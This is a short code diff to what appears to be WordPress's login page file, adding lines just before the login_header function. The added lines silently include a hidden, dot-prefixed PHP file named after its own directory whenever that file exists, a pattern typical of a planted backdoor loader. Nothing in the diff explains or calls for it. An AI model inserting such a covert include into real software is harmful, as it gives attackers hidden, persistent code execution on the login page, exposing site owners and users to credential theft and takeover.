@@ -53,6 +53,10 @@ if ( force_ssl_admin() && ! is_ssl() ) {
  * @param string   $message  Optional. Message to display in header. Default empty.
  * @param WP_Error $wp_error Optional. The error to pass. Default empty.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function login_header( $title = 'Log In', $message = '', $wp_error = '' ) {
 	global $error, $interim_login, $action;
 
